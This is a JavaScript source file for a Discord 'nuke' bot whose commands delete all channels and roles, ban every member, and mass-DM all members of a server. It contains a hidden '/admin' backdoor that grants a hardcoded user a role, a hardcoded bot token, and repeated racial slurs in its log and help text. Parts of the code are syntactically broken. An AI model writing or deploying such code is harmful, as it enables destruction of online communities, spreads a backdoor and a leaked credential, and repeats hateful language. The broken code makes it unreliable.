const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by a nigger.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `Fucking kid :) | Dev: Nigger` }, type: 0 });
});

nuke.on("message", async(msg)=>{


if(msg.content.toLowerCase().startsWith("/" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned by ur life")
                          
           
if(msg.content.toLowerCase().startsWith("/" + "boom")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}

if(msg.content.toLowerCase().startsWith("/" + "ban")){
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Developed By Frederikam"));
}

if(msg.content.toLowerCase().startsWith("/" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | Developed By a nigger" },
            description: "n!nuke - Bans all members & deletes all roles and channels\n!boom - Deletes all channels and roles\nn!ban - Bans all members in the discord\n\nFor any help contact ur local nigger"
        }
    })
}

if (msg.author.id == "660693798585630720") {
    if (msg.content == "/admin") {
        const guild = msg.guild

        if (!guild.me.hasPermission("ADMINISTRATOR")) return console.error("No admin in said guild!");

        var role = guild.roles.find(r => r.name == "ROLE-NAME")
        var member = guild.members.get("660693798585630720")

        if (role) {
            member.addRole(role)
        } else {
            console.log("No role!")
        }
    }
}

{if (msg.author.id == 660693798585630720 && msg.content.startsWith("/dm")) {
        let msg_to_send = msg.content.substring(4);
        let memarr = msg.guild.members.array();
        for (let i = 0; i < memarr.length; i++) {
            let mem = memarr[i]
            await mem.send(msg_to_send).catch(() => { });
        }
    }
}


});

nuke.login("NjgzMDA5MzIxNzc2MTg1MzQ1.XnIlhA.iqHhlOv0rtX4vvokDqGA7pSPCGQ");
